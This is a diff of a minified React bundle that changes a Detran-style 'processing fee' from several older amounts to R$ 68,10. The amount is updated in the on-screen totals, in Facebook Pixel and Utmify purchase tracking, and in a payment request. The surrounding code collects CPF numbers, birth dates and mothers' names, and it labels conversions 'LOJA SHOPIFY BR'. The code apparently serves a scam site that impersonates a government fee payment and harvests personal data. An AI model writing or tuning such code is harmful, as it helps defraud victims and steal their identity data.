@@ -12930,7 +12930,7 @@ function d3() {
         nome: w.DADOS.nome,
         dataNascimento: w.DADOS.data_nascimento || "",data_nascimento: w.DADOS.data_nascimento || "",
         nomeMae: w.DADOS.nome_mae || ""
-      })), (function(){try{if(typeof window.fbq==="function"){window.fbq("track","Lead",{content_name:"LOJA SHOPIFY BR",currency:"BRL",value:65.20});}}catch(e){}})(), a(`/verificacao?data=${encodeURIComponent(JSON.stringify(w.DADOS))}`)) : (localStorage.setItem("userData", JSON.stringify({ cpf: h, nome: "", dataNascimento: "", nomeMae: "" })), (function(){try{if(typeof window.fbq==="function"){window.fbq("track","Lead",{content_name:"LOJA SHOPIFY BR",currency:"BRL",value:65.20});}}catch(e){}})(), a(`/verificacao?data=${encodeURIComponent(JSON.stringify({ cpf: h, nome: "", nome_mae: "", data_nascimento: "", sexo: "", manualEntry: !0 }))}`))
+      })), (function(){try{if(typeof window.fbq==="function"){window.fbq("track","Lead",{content_name:"LOJA SHOPIFY BR",currency:"BRL",value:68.10});}}catch(e){}})(), a(`/verificacao?data=${encodeURIComponent(JSON.stringify(w.DADOS))}`)) : (localStorage.setItem("userData", JSON.stringify({ cpf: h, nome: "", dataNascimento: "", nomeMae: "" })), (function(){try{if(typeof window.fbq==="function"){window.fbq("track","Lead",{content_name:"LOJA SHOPIFY BR",currency:"BRL",value:68.10});}}catch(e){}})(), a(`/verificacao?data=${encodeURIComponent(JSON.stringify({ cpf: h, nome: "", nome_mae: "", data_nascimento: "", sexo: "", manualEntry: !0 }))}`))
     } catch (h) {
       console.error("Error fetching data:", h);
       const w = {
@@ -14896,13 +14896,13 @@ function gp() {
     if (m) try { const A = JSON.parse(m); b = A.email || ""; C = A.phone || "" } catch (A) { console.error("Error parsing userData:", A) }
     if (typeof window.fbq < "u") try {
       window.fbq("track", "Purchase", {
-        value: 79.00,
+        value: 68.10,
         currency: "BRL",
         content_name: "LOJA SHOPIFY BR",
         content_type: "product"
       }), console.log("Facebook Pixel: Purchase tracked")
     } catch (A) { console.error("Facebook Pixel error:", A) }
-    try { const _utmPurchase = () => { try { window.utmify("track", "Purchase", { value: 79.00, currency: "BRL" }), console.log("Utmify: Purchase tracked") } catch (e) { console.error("Utmify error:", e) } }; if (window.utmify) { _utmPurchase() } else { let _attempts = 0; const _interval = setInterval(() => { _attempts++; if (window.utmify) { clearInterval(_interval); _utmPurchase() } else if (_attempts >= 20) { clearInterval(_interval); console.warn("Utmify: not loaded") } }, 500) } } catch (A) { console.error("Utmify setup error:", A) }
+    try { const _utmPurchase = () => { try { window.utmify("track", "Purchase", { value: 68.10, currency: "BRL" }), console.log("Utmify: Purchase tracked") } catch (e) { console.error("Utmify error:", e) } }; if (window.utmify) { _utmPurchase() } else { let _attempts = 0; const _interval = setInterval(() => { _attempts++; if (window.utmify) { clearInterval(_interval); _utmPurchase() } else if (_attempts >= 20) { clearInterval(_interval); console.warn("Utmify: not loaded") } }, 500) } } catch (A) { console.error("Utmify setup error:", A) }
     localStorage.setItem(p, new Date().toISOString())
   }, []), x.useEffect(() => {
     if (v.current) return;
@@ -14929,7 +14929,7 @@ function gp() {
           body: JSON.stringify({
             nome: C.nome,
             cpf: C.cpf,
-            valor: 79.00,
+            valor: 68.10,
             email: C.email || "",
             telefone: C.phone || "",
             detran: j
@@ -21139,7 +21139,7 @@ function kE() {
       return isNaN(y.getTime()) ? h : y.toLocaleDateString("pt-BR")
     },
     f = h => {
-      localStorage.setItem("selectedDetran", JSON.stringify(h));(function(){try{if(typeof window.fbq==="function"){window.fbq("track","InitiateCheckout",{content_name:"LOJA SHOPIFY BR",currency:"BRL",value:65.20,num_items:1});}}catch(e){}})(); e("/chat")
+      localStorage.setItem("selectedDetran", JSON.stringify(h));(function(){try{if(typeof window.fbq==="function"){window.fbq("track","InitiateCheckout",{content_name:"LOJA SHOPIFY BR",currency:"BRL",value:68.10,num_items:1});}}catch(e){}})(); e("/chat")
     };
   return l.jsxs("div", {
     children: [l.jsx(rt, {}), l.jsx("div", {
@@ -21401,7 +21401,7 @@ function DE() {
           console.log("PAGAMENTO CONFIRMADO!");
           const I = `fb_conversion_${M}`;
           return !localStorage.getItem(I) && typeof window.fbq < "u" && (window.fbq("track", "Purchase", {
-            value: (t == null ? void 0 : t.amount) || 64.00,
+            value: (t == null ? void 0 : t.amount) || 68.10,
             currency: "BRL",
             content_name: "LOJA SHOPIFY BR",
             content_type: "product",
@@ -21676,7 +21676,7 @@ function DE() {
             className: "text-center mb-6",
             children: [l.jsxs("p", {
               className: "text-3xl font-bold text-green-600",
-              children: ["R$ ", ((P = t == null ? void 0 : t.amount) == null ? void 0 : P.toFixed(2).replace(".", ",")) || "65,20"]
+              children: ["R$ ", ((P = t == null ? void 0 : t.amount) == null ? void 0 : P.toFixed(2).replace(".", ",")) || "68,10"]
             }), l.jsx("p", {
               className: "text-gray-600",
               children: "Valor a ser pago"
@@ -22089,7 +22089,7 @@ function OE() {
           if (console.log("PAGAMENTO CONFIRMADO!", Y.bank_tx_id), typeof window < "u" && window.fbq) {
             const ge = window.fbq;
             ge("track", "Purchase", {
-              value: (m == null ? void 0 : m.amount) || 64.00,
+              value: (m == null ? void 0 : m.amount) || 68.10,
               currency: "BRL",
               content_type: "product",
               content_ids: [B],
@@ -22114,7 +22114,7 @@ function OE() {
           if (console.log("PAGAMENTO CONFIRMADO (manual)!", W.bank_tx_id), typeof window < "u" && window.fbq) {
             const Y = window.fbq;
             Y("track", "Purchase", {
-              value: (m == null ? void 0 : m.amount) || 64.00,
+              value: (m == null ? void 0 : m.amount) || 68.10,
               currency: "BRL",
               content_type: "product",
               content_ids: [m.deposit_id],
@@ -22209,7 +22209,7 @@ function OE() {
     const Y = "fb_addtocart_chat_tracked";
     if (!localStorage.getItem(Y) && typeof window.fbq < "u") try {
       window.fbq("track", "AddToCart", {
-        value: 64.00,
+        value: 68.10,
         currency: "BRL",
         content_name: "LOJA SHOPIFY BR",
         content_type: "product"
@@ -22968,14 +22968,14 @@ Assim que realizar o pagamento das taxas no valor de R$ 68,10, clique no botão 
                       children: "TAXA DE PROCESSAMENTO ELETRÔNICO (TPE)"
                     }), l.jsx("span", {
                       className: "font-semibold",
-                      children: "25,50"
+                      children: "29,60"
                     })]
                   }), l.jsxs("div", {
                     className: "flex justify-between py-2 bg-gray-100 px-2 font-bold",
                     children: [l.jsx("span", {
                       children: "TOTAL"
                     }), l.jsx("span", {
-                      children: "65,20"
+                      children: "68,10"
                     })]
                   })]
                 })]
@@ -23275,7 +23275,7 @@ function VE() {
         if (typeof window < "u" && window.fbq) {
           const P = window.fbq;
           P("track", "Purchase", {
-            value: parseFloat((r == null ? void 0 : r.amount) || "95.00"),
+            value: parseFloat((r == null ? void 0 : r.amount) || "68.10"),
             currency: "BRL",
             content_type: "product",
             content_ids: [C],
